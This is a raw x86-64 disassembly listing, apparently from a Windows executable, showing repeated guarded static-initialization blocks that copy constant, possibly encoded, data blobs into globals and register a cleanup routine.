   140007233:	c6 05 b6 6f 28 00 01 	movb   $0x1,0x286fb6(%rip)        # 0x14028e1f0
   14000723a:	66 0f 6f 05 fe 34 00 	movdqa 0x34fe(%rip),%xmm0        # 0x14000a740
   140007241:	00 
   140007242:	66 0f 7f 05 96 6f 28 	movdqa %xmm0,0x286f96(%rip)        # 0x14028e1e0
   140007249:	00 
   14000724a:	48 8d 0d 8f 11 00 00 	lea    0x118f(%rip),%rcx        # 0x1400083e0
   140007251:	e8 1a a1 ff ff       	call   0x140001370
   140007256:	c6 05 45 6c 28 00 01 	movb   $0x1,0x286c45(%rip)        # 0x14028dea2
   14000725d:	80 3d 8c 6f 28 00 00 	cmpb   $0x0,0x286f8c(%rip)        # 0x14028e1f0
   140007264:	0f 85 6f d4 ff ff    	jne    0x1400046d9
   14000726a:	e9 91 d4 ff ff       	jmp    0x140004700
   14000726f:	c6 05 60 70 28 00 01 	movb   $0x1,0x287060(%rip)        # 0x14028e2d6
   140007276:	48 8d 0d 83 6f 28 00 	lea    0x286f83(%rip),%rcx        # 0x14028e200
   14000727d:	48 8d 15 46 3a 00 00 	lea    0x3a46(%rip),%rdx        # 0x14000acca
   140007284:	41 b8 d6 00 00 00    	mov    $0xd6,%r8d
   14000728a:	e8 21 2a 00 00       	call   0x140009cb0
   14000728f:	48 8d 0d 5a 11 00 00 	lea    0x115a(%rip),%rcx        # 0x1400083f0
   140007296:	e8 d5 a0 ff ff       	call   0x140001370
   14000729b:	c6 05 01 6c 28 00 01 	movb   $0x1,0x286c01(%rip)        # 0x14028dea3
   1400072a2:	80 3d 2d 70 28 00 00 	cmpb   $0x0,0x28702d(%rip)        # 0x14028e2d6
   1400072a9:	0f 85 90 d4 ff ff    	jne    0x14000473f
   1400072af:	e9 14 d6 ff ff       	jmp    0x1400048c8
   1400072b4:	c6 05 8b 70 28 00 01 	movb   $0x1,0x28708b(%rip)        # 0x14028e346
   1400072bb:	0f 10 05 de 3a 00 00 	movups 0x3ade(%rip),%xmm0        # 0x14000ada0
   1400072c2:	0f 29 05 17 70 28 00 	movaps %xmm0,0x287017(%rip)        # 0x14028e2e0
   1400072c9:	0f 10 05 e0 3a 00 00 	movups 0x3ae0(%rip),%xmm0        # 0x14000adb0
   1400072d0:	0f 29 05 19 70 28 00 	movaps %xmm0,0x287019(%rip)        # 0x14028e2f0
   1400072d7:	0f 10 05 e2 3a 00 00 	movups 0x3ae2(%rip),%xmm0        # 0x14000adc0
   1400072de:	0f 29 05 1b 70 28 00 	movaps %xmm0,0x28701b(%rip)        # 0x14028e300
   1400072e5:	0f 10 05 e4 3a 00 00 	movups 0x3ae4(%rip),%xmm0        # 0x14000add0
   1400072ec:	0f 29 05 1d 70 28 00 	movaps %xmm0,0x28701d(%rip)        # 0x14028e310
   1400072f3:	0f 10 05 e6 3a 00 00 	movups 0x3ae6(%rip),%xmm0        # 0x14000ade0
   1400072fa:	0f 29 05 1f 70 28 00 	movaps %xmm0,0x28701f(%rip)        # 0x14028e320
   140007301:	f3 0f 6f 05 e7 3a 00 	movdqu 0x3ae7(%rip),%xmm0        # 0x14000adf0
   140007308:	00 
   140007309:	66 0f 7f 05 1f 70 28 	movdqa %xmm0,0x28701f(%rip)        # 0x14028e330
   140007310:	00 
   140007311:	48 b8 c4 00 d5 00 d7 	movabs $0x6300d700d500c4,%rax
   140007318:	00 63 00 
   14000731b:	48 89 05 1c 70 28 00 	mov    %rax,0x28701c(%rip)        # 0x14028e33e
   140007322:	48 8d 0d 37 11 00 00 	lea    0x1137(%rip),%rcx        # 0x140008460
   140007329:	e8 42 a0 ff ff       	call   0x140001370
   14000732e:	c6 05 6f 6b 28 00 01 	movb   $0x1,0x286b6f(%rip)        # 0x14028dea4
   140007335:	80 3d 0a 70 28 00 00 	cmpb   $0x0,0x28700a(%rip)        # 0x14028e346
   14000733c:	0f 85 bd d5 ff ff    	jne    0x1400048ff
   140007342:	e9 99 d6 ff ff       	jmp    0x1400049e0
   140007347:	c6 05 14 70 28 00 01 	movb   $0x1,0x287014(%rip)        # 0x14028e362
   14000734e:	66 0f 6f 05 2a 34 00 	movdqa 0x342a(%rip),%xmm0        # 0x14000a780
   140007355:	00 
   140007356:	66 0f 7f 05 f2 6f 28 	movdqa %xmm0,0x286ff2(%rip)        # 0x14028e350
   14000735d:	00 
   14000735e:	66 c7 05 f9 6f 28 00 	movw   $0x87,0x286ff9(%rip)        # 0x14028e360
   140007365:	87 00 
   140007367:	48 8d 0d 32 11 00 00 	lea    0x1132(%rip),%rcx        # 0x1400084a0
   14000736e:	e8 fd 9f ff ff       	call   0x140001370
   140007373:	c6 05 2b 6b 28 00 01 	movb   $0x1,0x286b2b(%rip)        # 0x14028dea5
   14000737a:	80 3d e1 6f 28 00 00 	cmpb   $0x0,0x286fe1(%rip)        # 0x14028e362
   140007381:	0f 85 a0 d6 ff ff    	jne    0x140004a27
   140007387:	e9 d5 d6 ff ff       	jmp    0x140004a61
   14000738c:	c6 05 57 6b 28 00 01 	movb   $0x1,0x286b57(%rip)        # 0x14028deea
   140007393:	48 b8 17 00 fa 00 fa 	movabs $0x1700fa00fa0017,%rax
   14000739a:	00 17 00 
   14000739d:	48 89 05 3c 6b 28 00 	mov    %rax,0x286b3c(%rip)        # 0x14028dee0
   1400073a4:	66 c7 05 3b 6b 28 00 	movw   $0xbb,0x286b3b(%rip)        # 0x14028dee8
   1400073ab:	bb 00 
   1400073ad:	48 8d 0d 1c c5 ff ff 	lea    -0x3ae4(%rip),%rcx        # 0x1400038d0
   1400073b4:	e8 b7 9f ff ff       	call   0x140001370
   1400073b9:	c6 05 d1 6a 28 00 01 	movb   $0x1,0x286ad1(%rip)        # 0x14028de91
   1400073c0:	80 3d 23 6b 28 00 00 	cmpb   $0x0,0x286b23(%rip)        # 0x14028deea
   1400073c7:	0f 85 e6 d6 ff ff    	jne    0x140004ab3
   1400073cd:	e9 1b d7 ff ff       	jmp    0x140004aed
   1400073d2:	c6 05 fb 6f 28 00 01 	movb   $0x1,0x286ffb(%rip)        # 0x14028e3d4
   1400073d9:	0f 10 05 26 3a 00 00 	movups 0x3a26(%rip),%xmm0        # 0x14000ae06
   1400073e0:	0f 29 05 89 6f 28 00 	movaps %xmm0,0x286f89(%rip)        # 0x14028e370
   1400073e7:	0f 10 05 28 3a 00 00 	movups 0x3a28(%rip),%xmm0        # 0x14000ae16
   1400073ee:	0f 29 05 8b 6f 28 00 	movaps %xmm0,0x286f8b(%rip)        # 0x14028e380
   1400073f5:	0f 10 05 2a 3a 00 00 	movups 0x3a2a(%rip),%xmm0        # 0x14000ae26
   1400073fc:	0f 29 05 8d 6f 28 00 	movaps %xmm0,0x286f8d(%rip)        # 0x14028e390
   140007403:	0f 10 05 2c 3a 00 00 	movups 0x3a2c(%rip),%xmm0        # 0x14000ae36
   14000740a:	0f 29 05 8f 6f 28 00 	movaps %xmm0,0x286f8f(%rip)        # 0x14028e3a0
   140007411:	0f 10 05 2e 3a 00 00 	movups 0x3a2e(%rip),%xmm0        # 0x14000ae46
   140007418:	0f 29 05 91 6f 28 00 	movaps %xmm0,0x286f91(%rip)        # 0x14028e3b0
   14000741f:	f3 0f 6f 05 2f 3a 00 	movdqu 0x3a2f(%rip),%xmm0        # 0x14000ae56
   140007426:	00 
   140007427:	66 0f 7f 05 91 6f 28 	movdqa %xmm0,0x286f91(%rip)        # 0x14028e3c0
   14000742e:	00 
   14000742f:	c7 05 97 6f 28 00 59 	movl   $0x50059,0x286f97(%rip)        # 0x14028e3d0
   140007436:	00 05 00 
   140007439:	48 8d 0d 80 10 00 00 	lea    0x1080(%rip),%rcx        # 0x1400084c0
   140007440:	e8 2b 9f ff ff       	call   0x140001370
   140007445:	c6 05 5a 6a 28 00 01 	movb   $0x1,0x286a5a(%rip)        # 0x14028dea6
   14000744c:	e9 c8 d7 ff ff       	jmp    0x140004c19
   140007451:	c6 05 d6 6f 28 00 01 	movb   $0x1,0x286fd6(%rip)        # 0x14028e42e
   140007458:	66 0f 6f 05 60 33 00 	movdqa 0x3360(%rip),%xmm0        # 0x14000a7c0
   14000745f:	00 
   140007460:	66 0f 7f 05 a8 6f 28 	movdqa %xmm0,0x286fa8(%rip)        # 0x14028e410
   140007467:	00 
   140007468:	48 b8 9a 00 b8 00 b4 	movabs $0x9800b400b8009a,%rax
   14000746f:	00 98 00 
   140007472:	48 89 05 a7 6f 28 00 	mov    %rax,0x286fa7(%rip)        # 0x14028e420
   140007479:	c7 05 a5 6f 28 00 bb 	movl   $0xa800bb,0x286fa5(%rip)        # 0x14028e428
   140007480:	00 a8 00 
   140007483:	66 c7 05 a0 6f 28 00 	movw   $0x45,0x286fa0(%rip)        # 0x14028e42c
   14000748a:	45 00 
   14000748c:	48 8d 0d 7d 11 00 00 	lea    0x117d(%rip),%rcx        # 0x140008610
   140007493:	e8 d8 9e ff ff       	call   0x140001370
   140007498:	c6 05 09 6a 28 00 01 	movb   $0x1,0x286a09(%rip)        # 0x14028dea8
   14000749f:	80 3d 88 6f 28 00 00 	cmpb   $0x0,0x286f88(%rip)        # 0x14028e42e
   1400074a6:	0f 85 36 da ff ff    	jne    0x140004ee2
   1400074ac:	e9 ad da ff ff       	jmp    0x140004f5e
   1400074b1:	48 8d 0d dc 39 00 00 	lea    0x39dc(%rip),%rcx        # 0x14000ae94
   1400074b8:	e8 73 11 00 00       	call   0x140008630
   1400074bd:	48 8d 0d 5c 12 00 00 	lea    0x125c(%rip),%rcx        # 0x140008720
   1400074c4:	e8 a7 9e ff ff       	call   0x140001370
   1400074c9:	c6 05 d9 69 28 00 01 	movb   $0x1,0x2869d9(%rip)        # 0x14028dea9
   1400074d0:	80 3d 83 6f 28 00 00 	cmpb   $0x0,0x286f83(%rip)        # 0x14028e45a
   1400074d7:	0f 85 b4 da ff ff    	jne    0x140004f91
   1400074dd:	e9 25 db ff ff       	jmp    0x140005007
   1400074e2:	48 8d 0d d5 39 00 00 	lea    0x39d5(%rip),%rcx        # 0x14000aebe
   1400074e9:	e8 52 12 00 00       	call   0x140008740
   1400074ee:	48 8d 0d 1b 13 00 00 	lea    0x131b(%rip),%rcx        # 0x140008810
   1400074f5:	e8 76 9e ff ff       	call   0x140001370
   1400074fa:	c6 05 a9 69 28 00 01 	movb   $0x1,0x2869a9(%rip)        # 0x14028deaa
   140007501:	80 3d 7a 6f 28 00 00 	cmpb   $0x0,0x286f7a(%rip)        # 0x14028e482
   140007508:	0f 85 2c db ff ff    	jne    0x14000503a
   14000750e:	e9 7d db ff ff       	jmp    0x140005090
   140007513:	c6 05 90 6f 28 00 01 	movb   $0x1,0x286f90(%rip)        # 0x14028e4aa
   14000751a:	66 0f 6f 05 0e 33 00 	movdqa 0x330e(%rip),%xmm0        # 0x14000a830
   140007521:	00 
   140007522:	66 0f 7f 05 66 6f 28 	movdqa %xmm0,0x286f66(%rip)        # 0x14028e490
   140007529:	00 
   14000752a:	48 b8 b5 00 bc 00 c7 	movabs $0xc600c700bc00b5,%rax
   140007531:	00 c6 00 
   140007534:	48 89 05 65 6f 28 00 	mov    %rax,0x286f65(%rip)        # 0x14028e4a0
   14000753b:	66 c7 05 64 6f 28 00 	movw   $0x53,0x286f64(%rip)        # 0x14028e4a8
   140007542:	53 00 
   140007544:	48 8d 0d e5 12 00 00 	lea    0x12e5(%rip),%rcx        # 0x140008830
   14000754b:	e8 20 9e ff ff       	call   0x140001370
   140007550:	c6 05 54 69 28 00 01 	movb   $0x1,0x286954(%rip)        # 0x14028deab
   140007557:	80 3d 4c 6f 28 00 00 	cmpb   $0x0,0x286f4c(%rip)        # 0x14028e4aa
   14000755e:	0f 85 5f db ff ff    	jne    0x1400050c3
   140007564:	e9 b6 db ff ff       	jmp    0x14000511f
   140007569:	c6 05 5c 6f 28 00 01 	movb   $0x1,0x286f5c(%rip)        # 0x14028e4cc
   140007570:	66 0f 6f 05 e8 32 00 	movdqa 0x32e8(%rip),%xmm0        # 0x14000a860
   140007577:	00 
   140007578:	66 0f 7f 05 30 6f 28 	movdqa %xmm0,0x286f30(%rip)        # 0x14028e4b0
   14000757f:	00 
   140007580:	48 b8 fb 00 06 00 0a 	movabs $0xd000a000600fb,%rax
   140007587:	00 0d 00 
   14000758a:	48 89 05 2f 6f 28 00 	mov    %rax,0x286f2f(%rip)        # 0x14028e4c0
   140007591:	c7 05 2d 6f 28 00 fa 	movl   $0x9700fa,0x286f2d(%rip)        # 0x14028e4c8
   140007598:	00 97 00 
   14000759b:	48 8d 0d ae 12 00 00 	lea    0x12ae(%rip),%rcx        # 0x140008850
   1400075a2:	e8 c9 9d ff ff       	call   0x140001370
   1400075a7:	c6 05 fe 68 28 00 01 	movb   $0x1,0x2868fe(%rip)        # 0x14028deac
   1400075ae:	80 3d 17 6f 28 00 00 	cmpb   $0x0,0x286f17(%rip)        # 0x14028e4cc
   1400075b5:	0f 85 97 db ff ff    	jne    0x140005152
   1400075bb:	e9 f9 db ff ff       	jmp    0x1400051b9
   1400075c0:	c6 05 7f 6f 28 00 01 	movb   $0x1,0x286f7f(%rip)        # 0x14028e546
   1400075c7:	0f 10 05 12 39 00 00 	movups 0x3912(%rip),%xmm0        # 0x14000aee0
   1400075ce:	0f 29 05 fb 6e 28 00 	movaps %xmm0,0x286efb(%rip)        # 0x14028e4d0
   1400075d5:	0f 10 05 14 39 00 00 	movups 0x3914(%rip),%xmm0        # 0x14000aef0
   1400075dc:	0f 29 05 fd 6e 28 00 	movaps %xmm0,0x286efd(%rip)        # 0x14028e4e0
   1400075e3:	0f 10 05 16 39 00 00 	movups 0x3916(%rip),%xmm0        # 0x14000af00
   1400075ea:	0f 29 05 ff 6e 28 00 	movaps %xmm0,0x286eff(%rip)        # 0x14028e4f0
   1400075f1:	0f 10 05 18 39 00 00 	movups 0x3918(%rip),%xmm0        # 0x14000af10
   1400075f8:	0f 29 05 01 6f 28 00 	movaps %xmm0,0x286f01(%rip)        # 0x14028e500
   1400075ff:	0f 10 05 1a 39 00 00 	movups 0x391a(%rip),%xmm0        # 0x14000af20
   140007606:	0f 29 05 03 6f 28 00 	movaps %xmm0,0x286f03(%rip)        # 0x14028e510
   14000760d:	0f 10 05 1c 39 00 00 	movups 0x391c(%rip),%xmm0        # 0x14000af30
   140007614:	0f 29 05 05 6f 28 00 	movaps %xmm0,0x286f05(%rip)        # 0x14028e520
   14000761b:	f3 0f 6f 05 1d 39 00 	movdqu 0x391d(%rip),%xmm0        # 0x14000af40
   140007622:	00 
   140007623:	66 0f 7f 05 05 6f 28 	movdqa %xmm0,0x286f05(%rip)        # 0x14028e530
   14000762a:	00 
   14000762b:	48 b8 f6 00 19 00 06 	movabs $0xa30006001900f6,%rax
   140007632:	00 a3 00 
   140007635:	48 89 05 02 6f 28 00 	mov    %rax,0x286f02(%rip)        # 0x14028e53e
   14000763c:	48 8d 0d 2d 12 00 00 	lea    0x122d(%rip),%rcx        # 0x140008870
   140007643:	e8 28 9d ff ff       	call   0x140001370
   140007648:	c6 05 5e 68 28 00 01 	movb   $0x1,0x28685e(%rip)        # 0x14028dead
   14000764f:	80 3d f0 6e 28 00 00 	cmpb   $0x0,0x286ef0(%rip)        # 0x14028e546
   140007656:	0f 85 94 db ff ff    	jne    0x1400051f0
   14000765c:	e9 84 dc ff ff       	jmp    0x1400052e5
   140007661:	c6 05 fe 6e 28 00 01 	movb   $0x1,0x286efe(%rip)        # 0x14028e566
   140007668:	66 0f 6f 05 30 32 00 	movdqa 0x3230(%rip),%xmm0        # 0x14000a8a0
   14000766f:	00 
   140007670:	66 0f 7f 05 d8 6e 28 	movdqa %xmm0,0x286ed8(%rip)        # 0x14028e550
   140007677:	00 
   140007678:	c7 05 de 6e 28 00 0e 	movl   $0x13000e,0x286ede(%rip)        # 0x14028e560
   14000767f:	00 13 00 
   140007682:	66 c7 05 d9 6e 28 00 	movw   $0xa3,0x286ed9(%rip)        # 0x14028e564
   140007689:	a3 00 
   14000768b:	48 8d 0d 1e 12 00 00 	lea    0x121e(%rip),%rcx        # 0x1400088b0
   140007692:	e8 d9 9c ff ff       	call   0x140001370
   140007697:	c6 05 10 68 28 00 01 	movb   $0x1,0x286810(%rip)        # 0x14028deae
   14000769e:	80 3d c1 6e 28 00 00 	cmpb   $0x0,0x286ec1(%rip)        # 0x14028e566
   1400076a5:	0f 85 50 dc ff ff    	jne    0x1400052fb
   1400076ab:	e9 a5 dc ff ff       	jmp    0x140005355
   1400076b0:	c6 05 3b 6f 28 00 01 	movb   $0x1,0x286f3b(%rip)        # 0x14028e5f2
   1400076b7:	48 8d 0d b2 6e 28 00 	lea    0x286eb2(%rip),%rcx        # 0x14028e570
   1400076be:	48 8d 15 91 38 00 00 	lea    0x3891(%rip),%rdx        # 0x14000af56
   1400076c5:	41 b8 82 00 00 00    	mov    $0x82,%r8d
   1400076cb:	e8 e0 25 00 00       	call   0x140009cb0
   1400076d0:	48 8d 0d f9 11 00 00 	lea    0x11f9(%rip),%rcx        # 0x1400088d0
   1400076d7:	e8 94 9c ff ff       	call   0x140001370
   1400076dc:	c6 05 cc 67 28 00 01 	movb   $0x1,0x2867cc(%rip)        # 0x14028deaf
   1400076e3:	80 3d 08 6f 28 00 00 	cmpb   $0x0,0x286f08(%rip)        # 0x14028e5f2
   1400076ea:	0f 85 92 dc ff ff    	jne    0x140005382
   1400076f0:	e9 73 dd ff ff       	jmp    0x140005468
   1400076f5:	48 8d 0d dc 38 00 00 	lea    0x38dc(%rip),%rcx        # 0x14000afd8
   1400076fc:	e8 1f 12 00 00       	call   0x140008920
   140007701:	48 8d 0d e8 12 00 00 	lea    0x12e8(%rip),%rcx        # 0x1400089f0
   140007708:	e8 63 9c ff ff       	call   0x140001370
   14000770d:	c6 05 9c 67 28 00 01 	movb   $0x1,0x28679c(%rip)        # 0x14028deb0
   140007714:	80 3d 07 6f 28 00 00 	cmpb   $0x0,0x286f07(%rip)        # 0x14028e622
   14000771b:	0f 85 5d dd ff ff    	jne    0x14000547e
   140007721:	e9 ae dd ff ff       	jmp    0x1400054d4
   140007726:	c6 05 7d 6f 28 00 01 	movb   $0x1,0x286f7d(%rip)        # 0x14028e6aa
   14000772d:	0f 10 05 c6 38 00 00 	movups 0x38c6(%rip),%xmm0        # 0x14000affa
   140007734:	0f 29 05 f5 6e 28 00 	movaps %xmm0,0x286ef5(%rip)        # 0x14028e630
   14000773b:	0f 10 05 c8 38 00 00 	movups 0x38c8(%rip),%xmm0        # 0x14000b00a
   140007742:	0f 29 05 f7 6e 28 00 	movaps %xmm0,0x286ef7(%rip)        # 0x14028e640
   140007749:	0f 10 05 ca 38 00 00 	movups 0x38ca(%rip),%xmm0        # 0x14000b01a
   140007750:	0f 29 05 f9 6e 28 00 	movaps %xmm0,0x286ef9(%rip)        # 0x14028e650
   140007757:	0f 10 05 cc 38 00 00 	movups 0x38cc(%rip),%xmm0        # 0x14000b02a
   14000775e:	0f 29 05 fb 6e 28 00 	movaps %xmm0,0x286efb(%rip)        # 0x14028e660
   140007765:	0f 10 05 ce 38 00 00 	movups 0x38ce(%rip),%xmm0        # 0x14000b03a
   14000776c:	0f 29 05 fd 6e 28 00 	movaps %xmm0,0x286efd(%rip)        # 0x14028e670
   140007773:	0f 10 05 d0 38 00 00 	movups 0x38d0(%rip),%xmm0        # 0x14000b04a
   14000777a:	0f 29 05 ff 6e 28 00 	movaps %xmm0,0x286eff(%rip)        # 0x14028e680
   140007781:	0f 10 05 d2 38 00 00 	movups 0x38d2(%rip),%xmm0        # 0x14000b05a
   140007788:	0f 29 05 01 6f 28 00 	movaps %xmm0,0x286f01(%rip)        # 0x14028e690
   14000778f:	f3 0f 6f 05 cd 38 00 	movdqu 0x38cd(%rip),%xmm0        # 0x14000b064
   140007796:	00 
   140007797:	f3 0f 7f 05 fb 6e 28 	movdqu %xmm0,0x286efb(%rip)        # 0x14028e69a
   14000779e:	00 
   14000779f:	48 8d 0d 6a 12 00 00 	lea    0x126a(%rip),%rcx        # 0x140008a10
   1400077a6:	e8 c5 9b ff ff       	call   0x140001370
   1400077ab:	c6 05 ff 66 28 00 01 	movb   $0x1,0x2866ff(%rip)        # 0x14028deb1
   1400077b2:	80 3d f1 6e 28 00 00 	cmpb   $0x0,0x286ef1(%rip)        # 0x14028e6aa
   1400077b9:	0f 85 42 dd ff ff    	jne    0x140005501
   1400077bf:	e9 59 de ff ff       	jmp    0x14000561d
   1400077c4:	c6 05 ff 6e 28 00 01 	movb   $0x1,0x286eff(%rip)        # 0x14028e6ca
   1400077cb:	66 0f 6f 05 0d 31 00 	movdqa 0x310d(%rip),%xmm0        # 0x14000a8e0
   1400077d2:	00 
   1400077d3:	66 0f 7f 05 d5 6e 28 	movdqa %xmm0,0x286ed5(%rip)        # 0x14028e6b0
   1400077da:	00 
   1400077db:	48 b8 f0 00 f3 00 fc 	movabs $0x100fc00f300f0,%rax
   1400077e2:	00 01 00 
   1400077e5:	48 89 05 d4 6e 28 00 	mov    %rax,0x286ed4(%rip)        # 0x14028e6c0
   1400077ec:	66 c7 05 d3 6e 28 00 	movw   $0x91,0x286ed3(%rip)        # 0x14028e6c8
   1400077f3:	91 00 
   1400077f5:	48 8d 0d 54 12 00 00 	lea    0x1254(%rip),%rcx        # 0x140008a50
   1400077fc:	e8 6f 9b ff ff       	call   0x140001370
   140007801:	c6 05 aa 66 28 00 01 	movb   $0x1,0x2866aa(%rip)        # 0x14028deb2
   140007808:	80 3d bb 6e 28 00 00 	cmpb   $0x0,0x286ebb(%rip)        # 0x14028e6ca
   14000780f:	0f 85 1e de ff ff    	jne    0x140005633
   140007815:	e9 73 de ff ff       	jmp    0x14000568d
   14000781a:	c6 05 21 6f 28 00 01 	movb   $0x1,0x286f21(%rip)        # 0x14028e742
   140007821:	0f 10 05 4c 38 00 00 	movups 0x384c(%rip),%xmm0        # 0x14000b074
   140007828:	0f 29 05 a1 6e 28 00 	movaps %xmm0,0x286ea1(%rip)        # 0x14028e6d0
   14000782f:	0f 10 05 4e 38 00 00 	movups 0x384e(%rip),%xmm0        # 0x14000b084
   140007836:	0f 29 05 a3 6e 28 00 	movaps %xmm0,0x286ea3(%rip)        # 0x14028e6e0
   14000783d:	0f 10 05 50 38 00 00 	movups 0x3850(%rip),%xmm0        # 0x14000b094
   140007844:	0f 29 05 a5 6e 28 00 	movaps %xmm0,0x286ea5(%rip)        # 0x14028e6f0
   14000784b:	0f 10 05 52 38 00 00 	movups 0x3852(%rip),%xmm0        # 0x14000b0a4
   140007852:	0f 29 05 a7 6e 28 00 	movaps %xmm0,0x286ea7(%rip)        # 0x14028e700
   140007859:	0f 10 05 54 38 00 00 	movups 0x3854(%rip),%xmm0        # 0x14000b0b4
   140007860:	0f 29 05 a9 6e 28 00 	movaps %xmm0,0x286ea9(%rip)        # 0x14028e710
   140007867:	0f 10 05 56 38 00 00 	movups 0x3856(%rip),%xmm0        # 0x14000b0c4
   14000786e:	0f 29 05 ab 6e 28 00 	movaps %xmm0,0x286eab(%rip)        # 0x14028e720
   140007875:	f3 0f 6f 05 57 38 00 	movdqu 0x3857(%rip),%xmm0        # 0x14000b0d4
   14000787c:	00 
   14000787d:	66 0f 7f 05 ab 6e 28 	movdqa %xmm0,0x286eab(%rip)        # 0x14028e730
   140007884:	00 
   140007885:	66 c7 05 b2 6e 28 00 	movw   $0x9d,0x286eb2(%rip)        # 0x14028e740
   14000788c:	9d 00 
   14000788e:	48 8d 0d db 11 00 00 	lea    0x11db(%rip),%rcx        # 0x140008a70
   140007895:	e8 d6 9a ff ff       	call   0x140001370
   14000789a:	c6 05 12 66 28 00 01 	movb   $0x1,0x286612(%rip)        # 0x14028deb3
   1400078a1:	80 3d 9a 6e 28 00 00 	cmpb   $0x0,0x286e9a(%rip)        # 0x14028e742
   1400078a8:	0f 85 0c de ff ff    	jne    0x1400056ba
   1400078ae:	e9 d5 de ff ff       	jmp    0x140005788
   1400078b3:	c6 05 a8 6e 28 00 01 	movb   $0x1,0x286ea8(%rip)        # 0x14028e762
   1400078ba:	66 0f 6f 05 4e 30 00 	movdqa 0x304e(%rip),%xmm0        # 0x14000a910
   1400078c1:	00 
   1400078c2:	66 0f 7f 05 86 6e 28 	movdqa %xmm0,0x286e86(%rip)        # 0x14028e750
   1400078c9:	00 
   1400078ca:	66 c7 05 8d 6e 28 00 	movw   $0x9d,0x286e8d(%rip)        # 0x14028e760
   1400078d1:	9d 00 
   1400078d3:	48 8d 0d d6 11 00 00 	lea    0x11d6(%rip),%rcx        # 0x140008ab0
   1400078da:	e8 91 9a ff ff       	call   0x140001370
   1400078df:	c6 05 ce 65 28 00 01 	movb   $0x1,0x2865ce(%rip)        # 0x14028deb4
   1400078e6:	80 3d 75 6e 28 00 00 	cmpb   $0x0,0x286e75(%rip)        # 0x14028e762
   1400078ed:	0f 85 ab de ff ff    	jne    0x14000579e
   1400078f3:	e9 e0 de ff ff       	jmp    0x1400057d8
   1400078f8:	c6 05 e5 6e 28 00 01 	movb   $0x1,0x286ee5(%rip)        # 0x14028e7e4
   1400078ff:	0f 10 05 e0 37 00 00 	movups 0x37e0(%rip),%xmm0        # 0x14000b0e6
   140007906:	0f 29 05 63 6e 28 00 	movaps %xmm0,0x286e63(%rip)        # 0x14028e770
   14000790d:	0f 10 05 e2 37 00 00 	movups 0x37e2(%rip),%xmm0        # 0x14000b0f6
   140007914:	0f 29 05 65 6e 28 00 	movaps %xmm0,0x286e65(%rip)        # 0x14028e780
   14000791b:	0f 10 05 e4 37 00 00 	movups 0x37e4(%rip),%xmm0        # 0x14000b106
   140007922:	0f 29 05 67 6e 28 00 	movaps %xmm0,0x286e67(%rip)        # 0x14028e790
   140007929:	0f 10 05 e6 37 00 00 	movups 0x37e6(%rip),%xmm0        # 0x14000b116
   140007930:	0f 29 05 69 6e 28 00 	movaps %xmm0,0x286e69(%rip)        # 0x14028e7a0
   140007937:	0f 10 05 e8 37 00 00 	movups 0x37e8(%rip),%xmm0        # 0x14000b126
   14000793e:	0f 29 05 6b 6e 28 00 	movaps %xmm0,0x286e6b(%rip)        # 0x14028e7b0
   140007945:	0f 10 05 ea 37 00 00 	movups 0x37ea(%rip),%xmm0        # 0x14000b136
   14000794c:	0f 29 05 6d 6e 28 00 	movaps %xmm0,0x286e6d(%rip)        # 0x14028e7c0
   140007953:	f3 0f 6f 05 eb 37 00 	movdqu 0x37eb(%rip),%xmm0        # 0x14000b146
   14000795a:	00 
   14000795b:	66 0f 7f 05 6d 6e 28 	movdqa %xmm0,0x286e6d(%rip)        # 0x14028e7d0
   140007962:	00 
   140007963:	c7 05 73 6e 28 00 28 	movl   $0xc50028,0x286e73(%rip)        # 0x14028e7e0
   14000796a:	00 c5 00 
   14000796d:	48 8d 0d 5c 11 00 00 	lea    0x115c(%rip),%rcx        # 0x140008ad0
   140007974:	e8 f7 99 ff ff       	call   0x140001370
   140007979:	c6 05 35 65 28 00 01 	movb   $0x1,0x286535(%rip)        # 0x14028deb5
   140007980:	80 3d 5d 6e 28 00 00 	cmpb   $0x0,0x286e5d(%rip)        # 0x14028e7e4
   140007987:	0f 85 78 de ff ff    	jne    0x140005805
   14000798d:	e9 55 df ff ff       	jmp    0x1400058e7
   140007992:	c6 05 6b 6e 28 00 01 	movb   $0x1,0x286e6b(%rip)        # 0x14028e804
   140007999:	66 0f 6f 05 8f 2f 00 	movdqa 0x2f8f(%rip),%xmm0        # 0x14000a930
   1400079a0:	00 
   1400079a1:	66 0f 7f 05 47 6e 28 	movdqa %xmm0,0x286e47(%rip)        # 0x14028e7f0
   1400079a8:	00 
   1400079a9:	c7 05 4d 6e 28 00 35 	movl   $0xc50035,0x286e4d(%rip)        # 0x14028e800
   1400079b0:	00 c5 00 
   1400079b3:	48 8d 0d 56 11 00 00 	lea    0x1156(%rip),%rcx        # 0x140008b10
   1400079ba:	e8 b1 99 ff ff       	call   0x140001370
   1400079bf:	c6 05 f0 64 28 00 01 	movb   $0x1,0x2864f0(%rip)        # 0x14028deb6
   1400079c6:	80 3d 37 6e 28 00 00 	cmpb   $0x0,0x286e37(%rip)        # 0x14028e804
   1400079cd:	0f 85 2a df ff ff    	jne    0x1400058fd
   1400079d3:	e9 6c df ff ff       	jmp    0x140005944
   1400079d8:	c6 05 4d 6e 28 00 01 	movb   $0x1,0x286e4d(%rip)        # 0x14028e82c
   1400079df:	66 0f 6f 05 69 2f 00 	movdqa 0x2f69(%rip),%xmm0        # 0x14000a950
   1400079e6:	00 
   1400079e7:	66 0f 7f 05 21 6e 28 	movdqa %xmm0,0x286e21(%rip)        # 0x14028e810
   1400079ee:	00 
   1400079ef:	48 b8 26 00 ed 00 24 	movabs $0x37002400ed0026,%rax
   1400079f6:	00 37 00 
   1400079f9:	48 89 05 20 6e 28 00 	mov    %rax,0x286e20(%rip)        # 0x14028e820
   140007a00:	c7 05 1e 6e 28 00 24 	movl   $0xbf0024,0x286e1e(%rip)        # 0x14028e828
   140007a07:	00 bf 00 
   140007a0a:	48 8d 0d 1f 11 00 00 	lea    0x111f(%rip),%rcx        # 0x140008b30
   140007a11:	e8 5a 99 ff ff       	call   0x140001370
   140007a16:	c6 05 9a 64 28 00 01 	movb   $0x1,0x28649a(%rip)        # 0x14028deb7
   140007a1d:	80 3d 08 6e 28 00 00 	cmpb   $0x0,0x286e08(%rip)        # 0x14028e82c
   140007a24:	0f 85 57 df ff ff    	jne    0x140005981
   140007a2a:	e9 b9 df ff ff       	jmp    0x1400059e8
   140007a2f:	48 8d 0d 24 37 00 00 	lea    0x3724(%rip),%rcx        # 0x14000b15a
   140007a36:	e8 15 11 00 00       	call   0x140008b50
   140007a3b:	48 8d 0d 6e 12 00 00 	lea    0x126e(%rip),%rcx        # 0x140008cb0
   140007a42:	e8 29 99 ff ff       	call   0x140001370
